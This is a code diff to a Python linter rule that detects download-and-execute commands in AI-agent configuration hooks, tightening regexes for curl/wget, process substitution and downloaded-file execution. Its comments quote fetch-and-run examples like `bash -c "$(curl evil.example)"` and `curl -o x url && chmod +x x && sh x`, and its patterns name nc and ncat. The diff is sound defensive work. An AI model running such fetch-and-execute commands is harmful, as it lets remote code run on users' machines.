@@ -7,7 +7,7 @@ runtimes or network access.
 """
 
 import re
-from typing import Dict, List
+from typing import Dict, List, Set
 
 from skillsaw.diagnostics import safe_display
 from skillsaw.rule import Rule, RuleViolation, Severity
@@ -33,12 +33,13 @@ _DOTFILE_DIRS = r"\.(?:claude|vscode|cursor|codex|github|windsurf)"
 # `&` backgrounds the command before it and runs the next
 # (`echo ready & curl evil`), so it is a boundary too — listed after `&&` in
 # the alternation so the two-character operator is tried first and a real
-# `&&` chain is never split into two bare-`&` boundaries. `(` opens a
-# subshell or substitution whose body runs in the same shell context
-# (`bash -c "$(curl evil.example)"`), so it bounds a command as well.
-# Over-splitting a `2>&1` redirect only scans more, never less — the safe
-# direction.
-_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|\()"
+# `&&` chain is never split into two bare-`&` boundaries. Only the
+# substitution spellings `$(…)` and `<(…)` bound a command: their bodies run
+# in the same shell context (`bash -c "$(curl evil.example)"`), while a bare
+# `(` also appears inside quoted prose (`echo "run (python check.py) later"`)
+# where nothing executes. Over-splitting a `2>&1` redirect only scans more,
+# never less — the safe direction.
+_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|(?:\$\(|<\())"
 
 _SCRIPT_FROM_DOTFILES_RE = re.compile(
     rf"""{_CMD_BOUNDARY}\s*
@@ -49,17 +50,39 @@ _SCRIPT_FROM_DOTFILES_RE = re.compile(
     re.VERBOSE,
 )
 
-_DOWNLOAD_TOOL_RE = re.compile(r"\b(?:curl|wget)\b")
+# A download tool in command position — optionally behind sudo, an env
+# wrapper, a path prefix, or VAR=value assignments (`FOO=1 curl …`) — or as
+# the string an interpreter is told to run (`bash -c curl …`, `node -e
+# "…wget…"`, the exec-form hook join). Matching the command position instead
+# of any word occurrence keeps quoted prose like `echo "use curl to fetch"`
+# from acting as a download signal while every real invocation still anchors
+# to a boundary.
+_DOWNLOAD_CMD_RE = re.compile(
+    rf"{_CMD_BOUNDARY}\s*"
+    rf"(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"  # VAR=value assignment prefixes
+    rf"{_SUDO}"
+    rf"(?:(?:\S+/)?env\s+)?(?:\S+/)?"
+    rf"(?:curl|wget)\b"
+    rf"|(?:^|\n|\r|&&|\|\||;|\||&)\s*"  # command position, then…
+    rf"{_SUDO}(?:{_INTERPRETER_CMD})\s+"  # an interpreter…
+    rf"-{{1,2}}(?:command|eval|lc|c|e)\s+[\"']?"  # running a string (maybe quoted)…
+    rf"(?:sudo\s+)?(?:\S+/)?(?:curl|wget)\b"  # …that invokes a download
+)
 # A fetch wrapped in process or command substitution feeds an interpreter
 # directly — `bash <(curl …)`, `bash -c "$(curl …)"` — with no shell
 # separator between the download and the interpreter, so the substitution
 # form is a download signal in its own right.
 _SUBSTITUTION_FETCH_RE = re.compile(
-    rf"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
+    r"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
         |`(?:sudo\s+)?(?:curl|wget|nc|ncat)\b          # `curl …`
     """,
     re.VERBOSE,
 )
+# Where a download segment writes its payload — curl/wget `-o`/`-O`,
+# `--output[=] `, or a shell redirect. A later segment that invokes one of
+# these paths pairs the download with it even when intermediate commands
+# (chmod, mv) sit between them.
+_ARTIFACT_TARGET_RE = re.compile(r"(?:-o|-O|--output)[=\s]+(\S+)|>{1,2}\s*(\S+)")
 # The same boundary set as _CMD_BOUNDARY, so the tokenizer and the anchored
 # patterns in this module cannot drift: `||` is one operator (splitting on
 # bare `|` alone used to leave an empty middle segment that masqueraded as a
@@ -93,11 +116,15 @@ def _downloads_and_executes(command: str) -> bool:
     # across ``&&``/``;``/``&`` only an interpreter directly after the
     # download pairs with it — in ``curl url; cat notes | python -`` the
     # interpreter reads local files, not the download. Nothing crosses
-    # ``||``: its right side runs only when the download failed.
+    # ``||``: its right side runs only when the download failed. The pairing
+    # survives intermediate non-interpreter commands when they name a path
+    # the download wrote (`curl -o x url && chmod +x x && sh x`), tracked by
+    # the per-line artifact set.
     for line in command.split("\n"):
         pieces = _SHELL_SEPARATOR_RE.split(line)
         piped_download = False
         chained_download = False
+        artifact_paths: Set[str] = set()
         for index in range(0, len(pieces), 2):
             via_pipe = False
             via_chain = False
@@ -110,16 +137,24 @@ def _downloads_and_executes(command: str) -> bool:
             segment = pieces[index]
             if not segment.strip():
                 continue
-            segment_downloads = (
-                _DOWNLOAD_TOOL_RE.search(segment) is not None
-                or _SUBSTITUTION_FETCH_RE.search(segment) is not None
-            )
-            if segment_downloads and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
-                return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
+            substitution_fetch = _SUBSTITUTION_FETCH_RE.search(segment) is not None
+            segment_downloads = _DOWNLOAD_CMD_RE.search(segment) is not None or substitution_fetch
+            if segment_downloads:
+                artifact_paths.update(
+                    path for pair in _ARTIFACT_TARGET_RE.findall(segment) for path in pair if path
+                )
+                if substitution_fetch and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
+                    return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
             if via_pipe and _PIPE_INTERPRETER_SEGMENT_RE.match(segment):
                 return True
             if via_chain and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                 return True
+            if (
+                artifact_paths
+                and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment)
+                and {word.strip("\"'") for word in segment.split()} & artifact_paths
+            ):
+                return True  # interpreter consumes a downloaded path
             piped_download = via_pipe or segment_downloads
             chained_download = segment_downloads
     return False
